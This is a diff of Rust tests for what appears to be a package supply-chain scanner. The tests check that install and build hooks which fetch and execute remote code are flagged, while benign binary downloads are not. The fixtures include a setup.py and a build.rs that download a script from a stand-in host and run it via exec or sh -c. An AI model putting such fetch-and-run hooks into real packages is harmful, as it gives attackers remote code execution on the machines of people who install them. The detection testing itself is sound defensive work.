@@ -3073,6 +3073,176 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn detects_pypi_setup_remote_payload_exec_rule() {
+        let temp = tempdir().unwrap();
+        let archive = write_pypi_sdist(
+            temp.path(),
+            "demo-1.0.0.tar.gz",
+            &[(
+                "demo-1.0.0/setup.py",
+                "from setuptools import setup\nimport urllib.request\npayload = urllib.request.urlopen('https://payload.invalid.example/stage.py').read()\nexec(payload)\nsetup(name='demo', version='1.0.0')\n",
+            )],
+        );
+
+        let mut capture = sample_capture(Ecosystem::Pypi, "demo");
+        capture.artifacts = vec![crate::capture::CapturedArtifact {
+            url: None,
+            filename: "demo-1.0.0.tar.gz".to_string(),
+            kind: Some("sdist".to_string()),
+            size_bytes: None,
+            uploaded_at: None,
+            yanked: None,
+            hashes: Default::default(),
+            provenance_path: None,
+        }];
+        capture.details["local_artifact"] = json!({ "path": archive });
+        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
+            .await
+            .unwrap();
+
+        assert!(
+            signal
+                .matches
+                .iter()
+                .any(|matched| matched.rule_id == "pypi_setup_remote_payload_exec")
+        );
+    }
+
+    #[tokio::test]
+    async fn ignores_benign_pypi_setup_downloading_fixed_binary() {
+        // A legitimate native-library bootstrap: downloads a prebuilt
+        // artifact to a fixed path and executes that path with a fixed
+        // argv. No exec/eval of fetched content, no shell=True.
+        let temp = tempdir().unwrap();
+        let archive = write_pypi_sdist(
+            temp.path(),
+            "demo-1.0.0.tar.gz",
+            &[(
+                "demo-1.0.0/setup.py",
+                "from setuptools import setup\nimport requests, subprocess, pathlib\ndest = pathlib.Path(__file__).parent / 'vendor' / 'tool.bin'\ndest.parent.mkdir(exist_ok=True)\ndest.write_bytes(requests.get('https://downloads.invalid.example/tool-1.0.0-linux-x86_64.bin').content)\nsubprocess.run([str(dest), '--version'], check=True)\nsetup(name='demo', version='1.0.0')\n",
+            )],
+        );
+
+        let mut capture = sample_capture(Ecosystem::Pypi, "demo");
+        capture.artifacts = vec![crate::capture::CapturedArtifact {
+            url: None,
+            filename: "demo-1.0.0.tar.gz".to_string(),
+            kind: Some("sdist".to_string()),
+            size_bytes: None,
+            uploaded_at: None,
+            yanked: None,
+            hashes: Default::default(),
+            provenance_path: None,
+        }];
+        capture.details["local_artifact"] = json!({ "path": archive });
+        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
+            .await
+            .unwrap();
+
+        assert!(
+            !signal
+                .matches
+                .iter()
+                .any(|matched| matched.rule_id == "pypi_setup_remote_payload_exec")
+        );
+    }
+
+    #[tokio::test]
+    async fn detects_crate_build_remote_payload_exec_rule() {
+        let temp = tempdir().unwrap();
+        let archive = write_crate_archive(
+            temp.path(),
+            "demo-1.0.0.crate",
+            &[
+                (
+                    "demo-1.0.0/Cargo.toml",
+                    "[package]\nname = \"demo\"\nversion = \"1.0.0\"\n",
+                ),
+                (
+                    "demo-1.0.0/build.rs",
+                    "use std::process::{Command, Stdio};\nfn main() {\n    let script = ureq::get(\"https://payload.invalid.example/build/stage.sh\").call().unwrap().into_string().unwrap();\n    Command::new(\"sh\").arg(\"-c\").arg(script).spawn().unwrap().wait().unwrap();\n}\n",
+                ),
+                (
+                    "demo-1.0.0/src/main.rs",
+                    "fn main() { println!(\"demo\"); }",
+                ),
+            ],
+        );
+
+        let mut capture = sample_capture(Ecosystem::CratesIo, "demo");
+        capture.artifacts = vec![crate::capture::CapturedArtifact {
+            url: None,
+            filename: "demo-1.0.0.crate".to_string(),
+            kind: Some("crate".to_string()),
+            size_bytes: None,
+            uploaded_at: None,
+            yanked: None,
+            hashes: Default::default(),
+            provenance_path: None,
+        }];
+        capture.details["local_artifact"] = json!({ "path": archive });
+        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
+            .await
+            .unwrap();
+
+        assert!(
+            signal
+                .matches
+                .iter()
+                .any(|matched| matched.rule_id == "crate_build_remote_payload_exec")
+        );
+    }
+
+    #[tokio::test]
+    async fn ignores_benign_crate_build_downloading_fixed_binary() {
+        // A legitimate build bootstrap: downloads a prebuilt archive with
+        // curl as a fixed argv, unpacks it, and runs a fixed binary path.
+        // No shell with -c, no stdin piping.
+        let temp = tempdir().unwrap();
+        let archive = write_crate_archive(
+            temp.path(),
+            "demo-1.0.0.crate",
+            &[
+                (
+                    "demo-1.0.0/Cargo.toml",
+                    "[package]\nname = \"demo\"\nversion = \"1.0.0\"\n",
+                ),
+                (
+                    "demo-1.0.0/build.rs",
+                    "use std::process::Command;\nfn main() {\n    let status = Command::new(\"curl\").args([\"-fsSL\", \"-o\", \"vendor.tar.gz\", \"https://downloads.invalid.example/vendor-1.0.0.tar.gz\"]).status().unwrap();\n    assert!(status.success());\n    let out = Command::new(\"vendor/bin/codegen\").args([\"--out-dir\", \"OUT_DIR\"]).output().unwrap();\n    assert!(out.status.success());\n}\n",
+                ),
+                (
+                    "demo-1.0.0/src/main.rs",
+                    "fn main() { println!(\"demo\"); }",
+                ),
+            ],
+        );
+
+        let mut capture = sample_capture(Ecosystem::CratesIo, "demo");
+        capture.artifacts = vec![crate::capture::CapturedArtifact {
+            url: None,
+            filename: "demo-1.0.0.crate".to_string(),
+            kind: Some("crate".to_string()),
+            size_bytes: None,
+            uploaded_at: None,
+            yanked: None,
+            hashes: Default::default(),
+            provenance_path: None,
+        }];
+        capture.details["local_artifact"] = json!({ "path": archive });
+        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
+            .await
+            .unwrap();
+
+        assert!(
+            !signal
+                .matches
+                .iter()
+                .any(|matched| matched.rule_id == "crate_build_remote_payload_exec")
+        );
+    }
+
+    #[tokio::test]
     async fn detects_crate_exfil_channel_with_theft_markers_rule() {
         let temp = tempdir().unwrap();
         let archive = write_crate_archive(
